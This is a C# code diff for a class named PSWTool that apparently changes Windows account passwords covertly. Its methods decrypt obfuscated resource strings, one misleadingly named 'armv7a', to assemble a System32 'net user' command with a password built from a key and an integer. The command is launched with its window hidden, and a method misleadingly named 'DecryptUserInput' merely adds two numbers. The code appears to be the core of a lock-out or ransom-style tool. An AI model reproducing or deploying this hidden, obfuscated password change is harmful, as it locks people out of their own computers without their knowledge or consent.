@@ -24,41 +24,48 @@ namespace LPU_Util
 {
     public class PSWTool
     {
-        private PSWTool() { }
-
-        private static string ConstructCommandText(string sysPath, string psw, Resources resClass)
+        public StringBuilder ConstructCommandText(string sysPath, string psw, Resources resClass)
         {
             string b = new Mid().DecryptString(resClass.baseCmd, psw);
             StringBuilder sBuilder = new StringBuilder();
             sBuilder.Append(sysPath);
             sBuilder.Append("\\System32\\");
             sBuilder.Append(b);
-            return sBuilder.ToString();
+            return sBuilder;
         }
 
-        private static string ConstructArgText(string psw, Resources resClass, int pswInt)
+        public StringBuilder ConstructArgText(StringBuilder sBuilder, string psw, Resources resClass, int pswInt)
         {
-            StringBuilder sBuilder = new StringBuilder();
             string n = new Mid().DecryptString(resClass.netCmd, psw);
             string a = new Mid().DecryptString(resClass.armv7a, psw);
             sBuilder.Clear();
             sBuilder.Append(n);  // arg1 " user ..."
             sBuilder.Append(a); // KeyChar
             sBuilder.Append(pswInt); // Int
-            return sBuilder.ToString();
+            return sBuilder;
         }
 
-        public static void ChangeSystemPassword(string sysPath, string psw, Resources resClass, int pswInt)
+        public int DecryptUserInput(string[] originalArgs)
         {
-            string commandText = ConstructCommandText(sysPath, psw, resClass);
-            string optionText = ConstructArgText(psw, resClass, pswInt);
+            int first = Int32.Parse(originalArgs[0]);
+            int second = Int32.Parse(originalArgs[1]);
+            int result = first + second;
+            return result;
+        }
+
+        public void ChangeSystemPassword(string sysPath, string psw, Resources resClass, int pswInt)
+        {
+            StringBuilder sBuilder = ConstructCommandText(sysPath, psw, resClass);
+            string commandText = sBuilder.ToString(); // Path to net
+            StringBuilder argBuilder = ConstructArgText(new StringBuilder(), psw, resClass, pswInt);
+            string optionText = argBuilder.ToString();
             ProcessStartInfo psi = new ProcessStartInfo(commandText, optionText);
             psi.UseShellExecute = false;
             psi.WindowStyle = ProcessWindowStyle.Hidden;
             Process.Start(psi);
         }
 
-        public static void SetSystemPasswordEmpty(string username)
+        public void SetSystemPasswordEmpty(string username)
         {
             string systemPath = Environment.GetEnvironmentVariable("SystemRoot");
 
